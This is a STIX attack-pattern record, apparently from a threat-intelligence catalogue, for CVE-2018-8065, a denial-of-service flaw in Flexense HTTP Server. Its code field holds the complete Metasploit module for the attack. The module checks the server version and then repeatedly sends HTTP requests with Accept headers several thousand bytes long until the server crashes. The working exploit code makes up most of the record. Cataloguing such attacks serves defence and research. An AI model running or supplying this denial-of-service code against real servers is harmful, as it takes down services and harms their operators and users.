{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e916c2eb-ad86-4f1f-ac3b-0c169844f46f",
    "created": "2024-08-14T16:26:19.86617Z",
    "modified": "2024-08-14T16:26:19.866174Z",
    "name": "Flexense HTTP Server Denial Of Service",
    "description": " This module triggers a Denial of Service vulnerability in the Flexense HTTP server. Vulnerability caused by a user mode write access memory violation and can be triggered with rapidly sending variety of HTTP requests with long HTTP header values.  Multiple Flexense applications that are using Flexense HTTP server 10.6.24 and below vesions reportedly vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/flexense_http_server_dos.rb",
            "external_id": "flexense_http_server_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8065"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/EgeBalci/Sync_Breeze_Enterprise_10_6_24_-DOS"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Dos\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Flexense HTTP Server Denial Of Service',\n      'Description'    => %q{\n        This module triggers a Denial of Service vulnerability in the Flexense HTTP server.\n        Vulnerability caused by a user mode write access memory violation and can be triggered with\n        rapidly sending variety of HTTP requests with long HTTP header values.\n\n        Multiple Flexense applications that are using Flexense HTTP server 10.6.24 and below vesions reportedly vulnerable.\n      },\n      'Author' \t\t=> [ 'Ege Balci <ege.balci@invictuseurope.com>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2018-8065'],\n          [ 'URL', 'https://github.com/EgeBalci/Sync_Breeze_Enterprise_10_6_24_-DOS' ],\n        ],\n      'DisclosureDate' => '2018-03-09'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('PacketCount',     [ true, \"The number of packets to be sent (Recommended: Above 1725)\" , 1725 ]),\n        OptString.new('PacketSize',      [ true, \"The number of bytes in the Accept header (Recommended: 4088-5090\"  , rand(4088..5090) ])\n      ])\n\n  end\n\n  def check\n    begin\n      connect\n      sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n      res = sock.get\n      if res and res.include? 'Flexense HTTP Server v10.6.24'\n        Exploit::CheckCode::Appears\n      else\n        Exploit::CheckCode::Safe\n      end\n    rescue Rex::ConnectionRefused\n      print_error(\"Target refused the connection\")\n      Exploit::CheckCode::Unknown\n    rescue\n      print_error(\"Target did not respond to HTTP request\")\n      Exploit::CheckCode::Unknown\n    end\n  end\n\n  def run\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n\n    size = datastore['PacketSize'].to_i\n    print_status(\"Starting with packets of #{size}-byte strings\")\n\n    count = 0\n    loop do\n      payload = \"\"\n      payload << \"GET /\" + Rex::Text.rand_text_alpha(rand(30)) + \" HTTP/1.1\\r\\n\"\n      payload << \"Host: 127.0.0.1\\r\\n\"\n      payload << \"Accept: \"+('A' * size)+\"\\r\\n\"\n      payload << \"\\r\\n\\r\\n\"\n      begin\n        connect\n        sock.put(payload)\n        disconnect\n        count += 1\n        break if count==datastore['PacketCount']\n      rescue ::Rex::InvalidDestination\n        print_error('Invalid destination!  Continuing...')\n      rescue ::Rex::ConnectionTimeout\n        print_error('Connection timeout!  Continuing...')\n      rescue ::Errno::ECONNRESET\n        print_error('Connection reset!  Continuing...')\n      rescue ::Rex::ConnectionRefused\n        print_good(\"DoS successful after #{count} packets with #{size}-byte headers\")\n        return true\n      end\n    end\n    print_error(\"DoS failed after #{count} packets of #{size}-byte strings\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-03-09"
}